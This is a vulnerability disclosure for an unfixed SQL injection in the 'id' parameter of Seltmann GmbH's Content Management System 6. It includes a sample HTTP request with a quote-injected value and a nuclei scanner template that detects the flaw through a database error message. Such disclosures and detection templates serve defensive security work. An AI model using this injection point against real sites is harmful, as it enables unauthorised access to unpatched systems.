# Seltmann GmbH / Content Management System 6 - SQL-Injection


**CVE-ID:** -


**Vendor:** Seltmann GmbH (https://www.seltmann-webdesign.de/)

**Affected Product:** Content Management System

**Affected Versions:** 6

**Vulnerability:** SQL-Injection

**Status:** Unfixed

**Severity:** Critical



## Details

The `id` parameter of the `/index.php` endpoint in the Content Management System of the *Seltmann GmbH* is vulnerable to SQL-Injection.

```http
GET /index.php?controller=index&function=change_lang_redirect&id=1%22&url=something HTTP/2
Host: localhost
[...]
```


## nuclei template
```yaml
id: seltmann-cms-sqli-id
info:
  name: Seltmann GmbH Content Management System 6 SQL-Injection "id"
  author: blockomat2100
  severity: high
  description: Seltmann GmbH Content Management System 6 SQL-Injection "id"
  reference:
    - https://github.com/blockomat2100/PoCs/blob/main/seltmann_gmbh_cms.md
  tags: cve

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?controller=index&function=change_lang_redirect&id=1"&url=/'
    redirects: true
    # without cookie reuse the template will not work
    cookie-reuse: true
    max-redirects: 7
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - DB IO-Error
      - type: regex
        part: body
        condition: or
        regex:
          - '(Content\sManagement\sSystem\s\|\s)(Version\s\d\n)([\w\d\W]+)(Seltmann GmbH)'
```
